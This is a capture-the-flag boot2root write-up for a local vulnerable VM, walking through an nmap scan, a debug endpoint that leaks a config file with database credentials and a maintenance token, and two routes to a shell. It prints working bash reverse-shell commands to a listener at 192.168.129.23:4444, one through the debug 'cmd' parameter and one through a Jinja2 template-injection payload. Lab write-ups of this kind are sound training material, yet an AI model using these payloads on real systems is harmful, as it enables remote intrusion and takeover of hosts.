# Boot2Root

## Discovery

After launching the vm, we scan the box's ip with nmap.
There might be a need to create a virtual interface and get the ip with an ip -a or ifconfig command
```
nmap -p- localhost

```
We get:

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-15 18:25 +0200
Nmap scan report for localhost (127.0.0.1)
Host is up (0.0000050s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE
5042/tcp open  asnaacceler8db
5919/tcp open  unknown
6060/tcp open  x11
7042/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1.23 seconds

```

By opening localhost on port 5042 with a browser we get a webpage
We can see right away, in the footer, that we're looking at a development build.
We should be able to find something.

in the head tag, we see the following comments
```
<!-- TODO: remove /api/debug before launch -->
<!-- debug.js still in /static/js/ pls remove -->
```
these will be the starting points for 2 different of ways of getting a shell into the box

### Debug endpoint

In api/debug we get
```
HAL9042 debug endpoint.
usage: ?file=<path>  |  ?cmd=<command>&token=<maintenance_token>
```

by trying some probable filenames we find http://localhost:5042/api/debug?file=config.py
```
# HAL9042 web frontend — configuration
# -------------------------------------
# paco: do NOT commit this with real values again. (it was committed. twice.)

DB_HOST = "127.0.0.1"
DB_NAME = "hal9042"
DB_USER = "hal9042"
DB_PASS = "Moulinette2024!"

SECRET_KEY = "hal9042secret"

# Internal maintenance token. The /api/debug console accepts this token to run
# diagnostic commands. Was supposed to be rotated before launch.
ADMIN_TOKEN = "h4l_d3bug_t0k3n_2024"

# Legacy debug endpoint. "removed" in a later commit (see git log) but the route
# is still wired in app.py.
DEBUG_ENDPOINT = "/api/debug"
ENV = "development"
```

You can get a shell with the debug url after starting a netcat listener on your side
```
nc -lvnp 4444
curl -v -G http://localhost:5042/api/debug\
 --data-urlencode "cmd=bash -c \"bash -i >& /dev/tcp/192.168.129.23/4444 0>&1\""\
 --data-urlencode "token=h4l_d3bug_t0k3n_2024"
```

this is a process/devops failure a dev build should never be deployed and several checks should be implemented in the CI/CD pipeline to prevent such a thing.

### Evaluate injection

In static/js/debug.js, we get
```
// static/js/debug.js
// paco: internal debug helper. NEVER linked from any template — leftover.
// (found via the exposed .git repo or by dirbusting /static/js/)
window.HAL_DEBUG = {
    // Setting this request header switches /evaluate into verbose render mode,
    // so the Jinja2-rendered output is returned instead of the opaque ack.
    debug_header: "X-Debug-Render",
    schema_endpoint: "/api/internal/schema",
    // legacy maintenance console — disabled in the UI, still on the server
    debug_endpoint: "/api/debug",
    note: "X-Debug-Render: true  ->  see what the template engine actually rendered"
};
```
we learned that the server is using jinja2 templates so we can try to inject python code using this evaluate endpoint with those headers
```
nc -lvnp 4444
curl -X POST http://localhost:5042/evaluate \
  -H "X-Debug-Render: true" \
  --data-urlencode "project_name={{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/192.168.129.23/4444 0>&1"').read() }}"
```


